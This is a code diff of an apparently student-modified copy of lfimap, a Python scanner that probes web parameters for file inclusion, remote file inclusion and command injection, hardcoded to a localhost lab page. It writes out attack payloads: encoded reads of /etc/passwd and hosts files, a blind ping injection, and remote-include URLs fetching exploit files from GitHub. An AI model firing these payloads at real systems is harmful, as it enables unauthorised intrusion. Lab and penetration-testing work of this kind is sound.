@@ -4,7 +4,6 @@ import os
 import sys
 import re
 import socket
-import subprocess
 import time
 import random
 import base64
@@ -83,6 +82,34 @@ KEY_WORDS = ["root:x:0:0", "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
 scriptDirectory = os.path.dirname(__file__)
 
 
+class ICMPThread(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.result = None
+
+    def run(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
+                              socket.IPPROTO_ICMP)
+            s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
+            self.result = False
+
+            while True:
+                data, addr = s.recvfrom(1024)
+                if (data):
+                    self.result = True
+        except PermissionError:
+            if (args.verbose):
+                print(
+                    "[-] Raw socket access is not allowed. For blind ICMP command injection test, rerun lfimap as admin/sudo with '-c'")
+
+    def getResult(self):
+        return self.result
+
+    def setResult(self, boolean):
+        self.result = boolean
+
+
 class ServerHandler(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
         super().__init__(*args, directory=webDir, **kwargs)
@@ -123,13 +150,13 @@ def prepareHeaders():
     ]
     headers = {}
 
-    if (args.agent):
-        headers['User-Agent'] = agent
-    else:  # TODO check these kidna stay in the request after this function call
-        headers['User-Agent'] = random.choice(user_agents)
-    if (args.referer):
-        headers['Referer'] = referer
-
+    # if (args.agent):
+    #    headers['User-Agent'] = agent
+    # else:  # TODO check these kidna stay in the request after this function call
+    #    headers['User-Agent'] = random.choice(user_agents)
+    # if (args.referer):
+    #    headers['Referer'] = referer
+    headers['User-Agent'] = random.choice(user_agents)
     headers['Accept'] = '*/*'
     headers['Connection'] = 'Close'
     return headers
@@ -156,52 +183,23 @@ def serve_forever():
 # TODO REMOVE ICMP feature its shite
 
 
-class ICMPThread(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
-        self.result = None
-
-    def run(self):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
-                              socket.IPPROTO_ICMP)
-            s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
-            self.result = False
-
-            while True:
-                data, addr = s.recvfrom(1024)
-                if (data):
-                    self.result = True
-        except PermissionError:
-            if (args.verbose):
-                print(
-                    "[-] Raw socket access is not allowed. For blind ICMP command injection test, rerun lfimap as admin/sudo with '-c'")
-
-    def getResult(self):
-        return self.result
-
-    def setResult(self, boolean):
-        self.result = boolean
-
-
 def addHeader(newKey, newVal):
     headers[newKey] = newVal
 
 
-def prepareRequest(parameter, payload):
+def prepareRequest(parameter, payload, checkEncode=False):
     global headers
 
     # Nếu tham số args.param được tìm thấy trong URL (args.url), nó sẽ được thay thế bằng giá trị payload sau khi được mã hóa. Kết quả được lưu trong biến reqUrl.
-    if (args.param in args.url):
+    if (args.param in args.url and checkEncode == True):
         reqUrl = args.url.replace(args.param, encode(payload))
     else:
-        reqUrl = args.url
+        reqUrl = args.url.replace(args.param, payload)
     # print(reqUrl)
     if (args.postreq):
         reqData = args.postreq.replace(parameter, encode(payload)).lstrip()
     else:
         reqData = ""
-
     reqHeaders = {}
     # Kiểm tra xem có thay thế nào đã được thực hiện trong header hay không
     if (args.param in headers.values()):
@@ -225,11 +223,12 @@ def prepareRequest(parameter, payload):
 # exploit: Cờ để xác định liệu yêu cầu là một yêu cầu khai thác hay không (mặc định là False).
 
 
-def REQUEST(url, headersData, postData, proxy, exploitType, exploitMethod, exploit=False):
+def REQUEST(url, headersData, postData,  exploitType, exploit=False):
     global tOut
 
     doContinue = True
     res = None
+
     if (not postData):  # Kiểm tra và xử lý dữ liệu POST nếu nó không tồn tại.
         postData = ""
     try:
@@ -238,22 +237,23 @@ def REQUEST(url, headersData, postData, proxy, exploitType, exploitMethod, explo
             # Thực hiện yêu cầu HTTP bằng cách sử dụng requests.request với các tham số như phương thức (args.method), URL, dữ liệu POST, header và proxy.
             if (tOut is not None):
                 res = requests.request(args.method, url, data=postData.encode(
-                    "utf-8"), headers=headersData, proxies=proxy, verify=False, timeout=tOut)
+                    "utf-8"), headers=headersData,  verify=False, timeout=tOut)
             else:
                 res = requests.request(args.method, url, data=postData.encode(
-                    "utf-8"), headers=headersData, proxies=proxy, verify=False)
+                    "utf-8"), headers=headersData,  verify=False)
         else:
             if (tOut is not None):
                 res = requests.request(args.method, url, data=postData.encode(
-                    "utf-8"), headers=headersData, proxies=proxy, verify=False, timeout=tOut)
+                    "utf-8"), headers=headersData,  verify=False, timeout=tOut)
             else:
                 res = requests.request(args.method, url, data=postData.encode(
-                    "utf-8"), headers=headersData, proxies=proxy, verify=False)
+                    "utf-8"), headers=headersData,  verify=False)
             # Kiểm tra và xử lý kết quả của yêu cầu:
 
             # Nếu exploit là True, gọi hàm init để kiểm tra và xử lý kết quả yêu cầu khai thác.
             # Nếu init trả về True, gán doContinue thành False để dừng thực hiện các yêu cầu tiếp theo.
-            if (init(res, "POST", exploitType, url, postData, headersData, exploitMethod)):
+            # print(res.text)
+            if (init(res, exploitType, url, postData)):
                 doContinue = False
 
         if (args.log):  # thực hiện ghi log
@@ -317,7 +317,7 @@ def REQUEST(url, headersData, postData, proxy, exploitType, exploitMethod, explo
     return res, doContinue
 
 
-def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable=False):
+def init(req, explType, getVal, postVal, cmdInjectable=False):
 
     if (scriptName != ""):  # Kiểm tra nếu scriptName khác rỗng, thêm scriptName và các phiên bản có thể của nó vào danh sách TO_REPLACE. Điều này đảm bảo rằng các chuỗi có chứa scriptName sẽ được xem là tiềm năng để thay thế
         TO_REPLACE.append(scriptName)
@@ -332,6 +332,7 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInject
         TO_REPLACE.append(
             "test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
     # Kiểm tra xem yêu cầu có chứa payload tấn công hoặc có khả năng bị tấn công không bằng cách gọi hàm checkPayload(req) hoặc kiểm tra cmdInjectable
+
     if (checkPayload(req) or cmdInjectable):
         # Lặp qua danh sách TO_REPLACE và kiểm tra xem có chuỗi TO_REPLACE[i] nào xuất hiện trong getVal, postVal, hoặc getVal kết hợp với "?c=".
         # Nếu có, thực hiện thay thế chuỗi TO_REPLACE[i] bằng tempArg trong getVal và postVal
@@ -379,10 +380,7 @@ def checkPayload(webResponse):
 
 def main():
     global exploits
-    global proxies
-
-    proxies['http'] = args.proxyAddr
-    proxies['https'] = args.proxyAddr
+    #global proxies
 
     if ("http" not in args.url):  # kiểm tra url
         if (args.verbose):
@@ -395,11 +393,10 @@ def main():
         # Hàm này được gọi để chuẩn bị URL, headers và dữ liệu POST cho yêu cầu kiểm tra. Giá trị trả về được lưu trong biến url, headers và postTest.
         url, headers, postTest = prepareRequest(args.param, "test")
         # Hàm này được gọi để thực hiện yêu cầu HTTP kiểm tra
-        r, _ = REQUEST(url, headers, postTest, proxies, "test", "test")
+        r, _ = REQUEST(url, headers, postTest, "test", "test")
 
         # Thời gian thực hiện yêu cầu được lưu trong biến initialReqTime.
         initialReqTime = r.elapsed.total_seconds()
-
         okCode = False
         # Nếu args.http_valid được chỉ định, vòng lặp kiểm tra xem mã HTTP của yêu cầu có trùng khớp với các mã được chỉ định trong args.http_valid không.
         # Nếu không có mã HTTP nào khớp, chương trình sẽ hiển thị thông báo không thể truy cập URL và thoát.
@@ -429,15 +426,20 @@ def main():
         stats["urls"] += 1
         url = args.url
         # Perform all tests
-
-        test_heuristics(url)
         test_filter(url)
+        print("\n" + "-"*40+"\n")
         test_input(url)
+        print("\n" + "-"*40+"\n")
         test_data(url)
+        print("\n" + "-"*40+"\n")
         test_expect(url)
+        print("\n" + "-"*40+"\n")
         test_rfi(url)
+        print("\n" + "-"*40+"\n")
         test_file_trunc(url)
+        print("\n" + "-"*40+"\n")
         test_trunc(url)
+        print("\n" + "-"*40+"\n")
         test_cmd_injection(url)
 
         lfimap_cleanup()
@@ -460,45 +462,82 @@ def main():
 
     lfimap_cleanup()
 
+# Mục đích của đoạn mã này là kiểm tra các lỗ hổng bao gồm tập tin bằng cách cố gắng bao gồm các tập tin cụ thể bằng cách sử dụng các định dạng đường dẫn tập tin khác nhau.
 
-def test_file_trunc(url):
+
+def test_rfi(url):
+    global webDir
+
     if (args.verbose):
-        print("[i] Testing file wrapper inclusion...")
+        print("[i] Testing remote file inclusion...")
 
-    tests = []
-    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
-    tests.append(
-        "file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
+    # Localhost RFI test
+    if (args.lhost):
+        try:
+            # Setup exploit serving path
+            if (os.access(scriptDirectory + "/exploits", os.R_OK)):
+                webDir = scriptDirectory + "/exploits"
+            else:
+                print("Directory '" + scriptDirectory +
+                      "/exploits' can't be accessed. Cannot setup local web server for RFI test.")
+                return
 
-    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
-    tests.append(
-        "file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")
+            threading.Thread(target=serve_forever).start()
+            rfiTest = []
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(
+                args.lhost, str(rfi_test_port)))
 
-    for i in range(len(tests)):
-        u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
-        _, br = REQUEST(u, reqHeaders, postTest, proxies, "LFI", "FILE")
-        if (not br):
-            return
-        if (i == 1 and args.quick):
-            return
+            for test in rfiTest:
+                u, reqHeaders, postTest = prepareRequest(args.param, test)
+                _, br = REQUEST(u, reqHeaders, postTest,
+                                "RFI", False)
+                if (not br):
+                    return
+                if (args.quick):
+                    return
+        except:
+            raise
+            pass
 
-
-def test_trunc(url):
+    # Internet RFI test
     if (args.verbose):
-        print("[i] Testing path truncation using '" +
-              truncWordlist + "' wordlist...")
-    i = 0
-    with open(truncWordlist, "r") as f:
-        for line in f:
-            line = line.replace("\n", "")
-            u, reqHeaders, postTest = prepareRequest(args.param, line)
-            _, br = REQUEST(u, reqHeaders, postTest, proxies, "LFI", "TRUNC")
+        print("[i] Trying to include internet-hosted file...")
+
+    pylds = []
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.php")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jsp")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.html")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.gif")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.png")
+
+    for pyld in pylds:
+        try:
+            u, reqHeaders, postTest = prepareRequest(args.param, pyld)
+            _, br = REQUEST(u, reqHeaders, postTest,
+                            "RFI", False)
             if (not br):
                 return
-            if (i == 1 and args.quick):
+            if (args.quick):
                 return
-            i += 1
-    return
+        except:
+            pass
 
 
 def test_cmd_injection(url):
@@ -545,7 +584,7 @@ def test_cmd_injection(url):
     for i in range(len(cmdList)):
         u, reqHeaders, postTest = prepareRequest(
             args.param, cmdList[i])  # kiểm tra lại url
-        _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "CMD")
+        _, br = REQUEST(u, reqHeaders, postTest, "RCE")
         if (not br):
             return
         if (i == 1 and args.quick):
@@ -570,13 +609,54 @@ def test_cmd_injection(url):
         for i in range(len(icmpTests)):
             url, reqHeaders, postTest = prepareRequest(
                 args.param, icmpTests[i])
-            _, br = REQUEST(url, reqHeaders, postTest, proxies, "RCE", "CMD")
+            _, br = REQUEST(url, reqHeaders, postTest, "RCE")
             if (t.getResult() == True):
                 t.setResult(False)
                 if (not br):
                     return
                 if (i == 1 and args.quick):
                     return
+
+
+def test_file_trunc(url):
+    if (args.verbose):
+        print("[i] Testing file wrapper inclusion...")
+
+    tests = []
+    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
+    tests.append(
+        "file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
+
+    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
+    tests.append(
+        "file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")
+
+    for i in range(len(tests)):
+        u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
+        _, br = REQUEST(u, reqHeaders, postTest, "LFI")
+        if (not br):
+            return
+        if (i == 1 and args.quick):
+            return
+
+
+def test_trunc(url):
+    if (args.verbose):
+        print("[i] Testing path truncation using '" +
+              truncWordlist + "' wordlist...")
+    i = 0
+    with open(truncWordlist, "r") as f:
+        for line in f:
+            line = line.replace("\n", "")
+            u, reqHeaders, postTest = prepareRequest(args.param, line)
+            _, br = REQUEST(u, reqHeaders, postTest, "LFI")
+            #print(_, br)
+            if (not br):
+                return
+            if (i == 1 and args.quick):
+                return
+            i += 1
+    return
 
 
 def test_input(url):
@@ -602,7 +682,7 @@ def test_input(url):
     for i in range(len(tests)):
         u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
         for j in range(len(posts)):
-            _, br = REQUEST(u, reqHeaders, posts[j], proxies, "RCE", "INPUT")
+            _, br = REQUEST(u, reqHeaders, posts[j], "RCE")
             if (not br):
                 return
             if (j == 1 and args.quick):
@@ -620,87 +700,12 @@ def test_expect(url):
 
     for i in range(len(tests)):
         u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
-        _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "EXPECT")
+        _, br = REQUEST(u, reqHeaders, postTest, "RCE")
         if (not br):
             return
         if (i == 1 and args.quick):
             return
     return
-
-
-def test_rfi(url):
-    global webDir
-
-    if (args.verbose):
-        print("[i] Testing remote file inclusion...")
-
-    # Localhost RFI test
-    if (args.lhost):
-        try:
-            # Setup exploit serving path
-            if (os.access(scriptDirectory + "/exploits", os.R_OK)):
-                webDir = scriptDirectory + "/exploits"
-            else:
-                print("Directory '" + scriptDirectory +
-                      "/exploits' can't be accessed. Cannot setup local web server for RFI test.")
-                return
-
-            threading.Thread(target=serve_forever).start()
-            rfiTest = []
-            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(
-                args.lhost, str(rfi_test_port)))
-            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(
-                args.lhost, str(rfi_test_port)))
-            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(
-                args.lhost, str(rfi_test_port)))
-            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(
-                args.lhost, str(rfi_test_port)))
-            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(
-                args.lhost, str(rfi_test_port)))
-            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(
-                args.lhost, str(rfi_test_port)))
-            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(
-                args.lhost, str(rfi_test_port)))
-
-            for test in rfiTest:
-                u, reqHeaders, postTest = prepareRequest(args.param, test)
-                _, br = REQUEST(u, reqHeaders, postTest,
-                                proxies, "RFI", "RFI", False)
-                if (not br):
-                    return
-                if (args.quick):
-                    return
-        except:
-            raise
-            pass
-
-    # Internet RFI test
-    if (args.verbose):
-        print("[i] Trying to include internet-hosted file...")
-
-    pylds = []
-    pylds.append(
-        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.php")
-    pylds.append(
-        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jsp")
-    pylds.append(
-        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.html")
-    pylds.append(
-        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.gif")
-    pylds.append(
-        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.png")
-
-    for pyld in pylds:
-        try:
-            u, reqHeaders, postTest = prepareRequest(args.param, pyld)
-            _, br = REQUEST(u, reqHeaders, postTest,
-                            proxies, "RFI", "RFI", False)
-            if (not br):
-                return
-            if (args.quick):
-                return
-        except:
-            pass
 
 
 def test_filter(url):
@@ -742,7 +747,7 @@ def test_filter(url):
 
     for i in range(len(tests)):
         u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
-        _, br = REQUEST(u, reqHeaders, postTest, proxies, "LFI", "FILTER")
+        _, br = REQUEST(u, reqHeaders, postTest,  "LFI")
         if (not br):
             return
         if (i == 1 and args.quick):
@@ -765,7 +770,7 @@ def test_data(url):
 
         for i in range(len(tests)):
             u, reqHeaders, postTest = prepareRequest(args.param, tests[i])
-            _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "DATA")
+            _, br = REQUEST(u, reqHeaders, postTest,  "RCE", )
             if (not br):
                 return
     else:
@@ -778,122 +783,87 @@ def test_data(url):
         for i in range(len(urls)):
             url, reqHeaders, postTest = prepareRequest(args.param, test)
             _, br = REQUEST(
-                url + encode(urls[i]), reqHeaders, postTest, proxies, "RCE", "DATA")
+                url + encode(urls[i]), reqHeaders, postTest, "RCE")
             if (not br):
                 return
     return
 
+# Cleans up all created files during testing
 
-def test_heuristics(url):
-    global headers
-    br = False
-    o = urlparse.urlparse(url)
+
+def test_rfi(url):
+    global webDir
 
     if (args.verbose):
-        print("\n[i] Testing for info disclosure using heuristics...")
+        print("[i] Testing remote file inclusion...")
 
-    tests = []
-    tests.append("l%3Ef%3Ci")
-    tests.append("%24%7B%7B1337%2A3113%7D%7D%27%24%7B1337%2A3113%7D")
-
-    # TODO store these in a separate file and make it very big
-    fiErrors = ["warning", "include(", "require(", "fopen(",
-                "fpassthru(", "readfile(", "fread(", "fgets("]
-    sqlErrors = ["you have an error in your sql syntax", "unclosed qutation mark after the character string",
-                 "you have an error in your sql syntax", "mysql_query(", "mysql_fetch_array(",
-                 "mysql_fetch_assoc(", "mysql_fetch_field(", "mysql_fetch_field_direct(", "mysql_fetch_lengths(",
-                 "mysql_fetch_object(", "mysql_fetch_row(", "mysql_fetch_all(", "mysql_prepare(", "mysql_info(",
-                 "mysql_real_query(", "mysql_stmt_init(", "mysql_stmt_execute("
-                 ]
-
-    for test in tests:
-        u, tempHeaders, postTest = prepareRequest(args.param, test)
-        res, _ = REQUEST(u, tempHeaders, postTest, proxies, "INFO", "INFO")
-
-        if ("l>f<i" in res.text.lower()):
-            if (args.postreq):
-                print("[+] XSS -> '" + u + "' -> HTTP POST -> '" +
-                      postTest + "' -> reflected 'l>f<i' in response")
+    # Localhost RFI test
+    if (args.lhost):
+        try:
+            # Setup exploit serving path
+            if (os.access(scriptDirectory + "/exploits", os.R_OK)):
+                webDir = scriptDirectory + "/exploits"
             else:
-                print("[+] XSS -> '" + u + "' -> reflected 'l>f<i' in response")
-            stats["vulns"] += 1
-            br = True
-            if ("Content-Type" in res.headers):
-                print("    Content-Type: '" +
-                      res.headers["Content-Type"] + "'")
-            if ("Content-Security-Policy" in res.headers):
-                if ("Content-Type" in res.headers):
-                    print("\n")
-                else:
-                    print("    Content-Security-Policy: '" +
-                          res.headers["Content-Security-Policy"] + "'")
+                print("Directory '" + scriptDirectory +
+                      "/exploits' can't be accessed. Cannot setup local web server for RFI test.")
+                return
 
-        if ("4162081" in res.text.lower()):
-            if (args.postreq):
-                print("[+] CSTI/SSTI -> '" + u + "' -> HTTP POST -> '" +
-                      postTest + "' -> {{1337*3113}} seems evaluated to 4162081")
-            else:
-                print("[+] CSTI/SSTI -> '" + u +
-                      "' -> expression {{1337*3113}} seems evaluated to 4162081")
-            stats["vulns"] += 1
-            br = True
+            threading.Thread(target=serve_forever).start()
+            rfiTest = []
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(
+                args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(
+                args.lhost, str(rfi_test_port)))
 
-        if (res.headers.get('Location') != None):
-            if (res.headers.get('Location') == "l>f<i"):
-                if (args.postreq):
-                    print("[+] Open redirect -> '" + u +
-                          "' -> HTTP POST -> '" + postTest + "'")
-                else:
-                    print("[+] Open redirect -> '" + u + "'")
-                stats["vulns"] += 1
-                br = True
+            for test in rfiTest:
+                u, reqHeaders, postTest = prepareRequest(args.param, test)
+                _, br = REQUEST(u, reqHeaders, postTest,
+                                "RFI", False)
+                if (not br):
+                    return
+                if (args.quick):
+                    return
+        except:
+            raise
+            pass
 
-        if (args.quick or br):
-            break
+    # Internet RFI test
+    if (args.verbose):
+        print("[i] Trying to include internet-hosted file...")
 
-    if (o.netloc not in checkedHosts):
-        checkedHosts.append(o.netloc)
-        if (fiErrors[0] in res.text.lower()):
-            for i in range(1, len(fiErrors)):
-                if (fiErrors[i] in res.text.lower()):
-                    if (args.postreq):
-                        print("[+] Info disclosure -> '" + fiErrors[i] +
-                              "' error triggered -> '" + u + "' -> HTTP POST -> '" + postTest + "'")
-                    else:
-                        print("[+] Info disclosure -> '" + fiErrors[i] +
-                              "' error triggered -> '" + u + "'")
-                    stats["vulns"] += 1
+    pylds = []
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.php")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jsp")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.html")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.gif")
+    pylds.append(
+        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.png")
 
-            # Check for Sql errors
-            for i in range(len(sqlErrors)):
-                if (sqlErrors[i] in res.text.lower()):
-                    if (args.postreq):
-                        print("[+] Info disclosure -> '" + sqlErrors[i] +
-                              "' error detected -> '" + u + "' -> HTTP POST -> '" + postTest + "'")
-                    else:
-                        print("[+] Info disclosure -> '" +
-                              sqlErrors[i] + "' error detected -> '" + u + "'")
-                    stats["vulns"] += 1
-
-        # Header-based info leak checks
-        if ("Server" in res.headers):
-            serv = res.headers["Server"].lower()
-            if (serv != "apache" and serv != "nginx"):
-                print("[+] Info leak -> Web server: " + res.headers['Server'])
-                stats["vulns"] += 1
-
-        resHeaders = "".join(res.headers).lower()
-        if ("x-powered-by" in resHeaders):
-            print("[+] Info leak -> Underlying backend technology: " +
-                  res.headers['X-Powered-By'])
-            stats["vulns"] += 1
-        if ("x-aspnet-version" in resHeaders):
-            print("[+] Info leak -> Underlying backend technology: " +
-                  res.headers["X-AspNet-Version"])
-            stats["vulns"] += 1
-    return
-
-# Cleans up all created files during testing
+    for pyld in pylds:
+        try:
+            u, reqHeaders, postTest = prepareRequest(args.param, pyld)
+            _, br = REQUEST(u, reqHeaders, postTest,
+                            "RFI", False)
+            if (not br):
+                return
+            if (args.quick):
+                return
+        except:
+            pass
 
 
 def lfimap_cleanup():
@@ -918,35 +888,37 @@ def lfimap_cleanup():
 if (__name__ == "__main__"):
 
     parser = argparse.ArgumentParser(
-        description="LFImap, Local File Inclusion discovery and exploitation tool", add_help=False)
+        description=" Local File Inclusion discovery and exploitation tool", add_help=False)
 
     # Add arguments to the parser
     # ...
 
     # Parse the command-line arguments
     args = parser.parse_args()
-    args.url = input("Enter URL: ")
+    args.url = "http://localhost:9991/FileInclusion/pages/lvl1.php?file=PWN"
     #args.f = input("Enter URL file: ")
     # Specify session cookie, Ex: "PHPSESSID=1943785348b45"'
-    args.cookie = input("Enter session cookie: ")
-    # Specify HTTP request form data
-    args.postreq = input("Enter HTTP request form data: ")
-    args.log = ""  # đường dẫn đến tệp ghi log
-    args.uselong = True  # or  False để dùng file dài hặc ngắn
-    args.verbose  # Print more detailed output when performing attacks
-    args.proxyAddr = "http://proxy.example.com:8080"
-    # Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"
-    args.httpheaders
-    args.http_valid  # có chỉ định url mẫu k
-    args.param  # Specify different testing placeholder value (default "PWN")'
-    args.delay  # set delay mỗi request
-    args.no_stop  # để dừng việc thực thi tiếp theo
-
+    args.cookie = "PHPSESSID=3bb8b36d307f1eceb4c8f4587bb436df"
+    # Chỉ định dữ liệu biểu mẫu yêu cầu HTTP
+    args.postreq = ""
+    # đường dẫn đến tệp ghi log
+    args.log = "/Users/tahai/Documents/Đang Học.../Chuyên đề cơ sở /File_Inclusion/FI/__pycache__/log.txt"
+    args.uselong = True   # or  False để dùng file dài hặc ngắn
+    args.verbose = ""  # In đầu ra chi tiết hơn khi thực hiện các cuộc tấn công
+    args.httpheaders = ""  # thêm vào cho header "X-Forwarded-For:127.0.0.1"
+    args.http_valid = ""  # có chỉ định url mẫu k mã các reponst 200,500,404
+    # Specify different testing placeholder value (default "PWN")'
+    args.param = "PWN"
+    args.delay = ""  # set delay mỗi request
+    args.no_stop = ""  # để dừng việc thực thi tiếp theo
+    args.method = "GET"
+    args.encodings = "U"  # U là base64
     url = args.url
+    args.lhost = None
+    args.quick = True
     #urlfile = args.f
-    truncWordlist = ""
-    agent = args.agent
-    referer = args.referer
+    truncWordlist = ""  # dùng file khác
+
     # Check if mandatory args are provided
     if (not args.url):  # kiểm tra tham số url có đc truyền vào không
         print("[-] Mandatory arguments  unspecified. Refer to help menu with help")
@@ -1058,26 +1030,6 @@ if (__name__ == "__main__"):
             print("[-] Failed creating log file: " + args.log +
                   ". Check if you specified correct path and have correct permissions...")
             sys.exit(-1)
-    # Check if proxy is correct
-    if (args.proxyAddr):  # xác định proxxy có đuwocj truyền không
-        try:
-            # Kiểm tra xem proxy có scheme (giao thức) được chỉ định hay không.
-            if ("http" not in args.proxyAddr and "socks" not in args.proxyAddr):
-                if (args.verbose):
-                    print("[i] No proxy scheme provided. Defaulting to http.")
-                args.proxyAddr = "http://" + args.proxyAddr
-
-            # Sử dụng requests.get() để gửi một yêu cầu GET tới args.proxyAddr và kiểm tra kết quả.
-            r = requests.get(args.proxyAddr, timeout=5, verify=False)
-            if (r.status_code >= 500):
-                print(
-                    "[-] Proxy is available, but it returns server-side error code >=500. Exiting...")
-                sys.exit(-1)
-        except:
-            print("[-] Proxy is not available. Exiting...")
-            sys.exit(-1)
-    else:  # xác định thời gian chờ
-        tOut = 1
 
     # Preparing headers
     headers = prepareHeaders()
